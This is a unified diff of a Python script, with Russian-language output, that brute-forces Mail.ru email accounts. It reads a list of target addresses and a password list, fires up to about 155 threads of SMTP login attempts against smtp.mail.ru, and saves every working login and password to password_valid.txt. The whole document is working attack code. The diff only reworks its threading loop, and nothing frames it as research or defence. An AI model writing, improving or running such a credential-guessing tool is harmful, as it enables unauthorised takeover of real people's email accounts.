@@ -2,23 +2,22 @@ import smtplib
 import threading
 import time
 
-passCount=-1
-passTrue=0
+f = open('MailruLogin.txt')
+email = f.readlines()
+print ("Всего email:", len(email))
+f.close()
 
-passwordDict = open ('MailruPass.txt')
-word = [line.strip(' \t\n\r') for line in passwordDict]
+f = open ('pass250.txt')
+word = f.readlines()
 print ("Всего паролей :", len(word))
-passwordDict.close()
+f.close()
 
-def brutThreadingStart(login=False):
-	global  passCount
-	if passCount >= len(word) : return 0	
-	passCount = passCount + 1
-	#str = passwordDict.readline().strip(' \t\n\r')	
-	threading.Thread(target = brut , args = ( login, word[passCount], passCount )).start()
 
-def brut(login, password, passCountLocal= False):	
-	global passCount, passTrue
+
+
+def brut(login, password, x, y = False):	
+	login = login.strip(' \n\t')
+	password = password.strip(' \n\t')	
 		
 	smtpObj = smtplib.SMTP('smtp.mail.ru')
 	smtpObj.starttls()
@@ -27,50 +26,31 @@ def brut(login, password, passCountLocal= False):
 		smtpObj.login(login, password)
 	except:
 		#if _FIND != 'ON': return 0
-		print ("#", passCountLocal, "\tНЕ верный пароль :",  login, "->", password)
-		smtpObj.quit()
-		brutThreadingStart(login)
-		return 0
+		print ("#", x ,"\tЦель ->", login, "#", y, "\tНЕ верный пароль :",  login, "->", password)
+		smtpObj.quit()		
+		return 
 	#Если пароль верный
-	print ("#", passCountLocal, "\t!!! Верный пароль: ", password,"для :", login)
+	print ("#", y, "\t!!! Верный пароль: ", password,"для :", login)
 	f=open ('password_valid.txt','a')
 	f.write(login +" -> " +  password + "\n")
 	f.close	
-	smtpObj.quit()
-	passCount = len(word)	
+	smtpObj.quit()		
 
 #Тело скрипта
-f = open('MailruLogin.txt')
-email = [line.strip(' \t\n\r') for line in f]
-print ("Всего email:", len(email))
-f.close()
+	
+for x in range(0,len(email)):
+	y=0
+	while y in range(0,len(word)):		
 
-j=-1
-while j <= len(email) :	
-	j=j+1
-	print ("Цель ->", email[j])		
-	while True:		
-		i = threading.active_count()
-		while i+1 < 355: #количество потоков
-			if passCount  >= len(word) : break
-			i= threading.active_count()			
-			brutThreadingStart(email[j])
+		if threading.active_count() < 155: # количество потоков			
+			threading.Thread(target = brut , args = ( email[x], word[y], x, y )).start()
+			y = y + 1
 			time.sleep(0.01)
-		time.sleep(3); 
-		print ("Активных потоков:", threading.active_count() )	
-		if passCount  >= len(word) and threading.active_count() <2 : break
-	passCount=-1
-"""
-f = open('passMailru.txt','w')
-f2 = open('emailMailru.txt','w')
-for line in passwordDict:
-	str = line.strip(' \t\n\r').split(":")
-	print (str)
-	f2.write(str[0]+'\n')
-	f.write(str[1]+'\n')
-f.close()
-f2.close()	
-"""
+		else:
+			time.sleep(0.1)
 
-#smtpObj.sendmail('Razor-men@mail.ru',"razor-men@mail.ru","go to bed!")
 
+'''
+#smtpObj.sendmail('Razor@mail.ru',"razor@mail.ru","go to bed!")
+
+'''
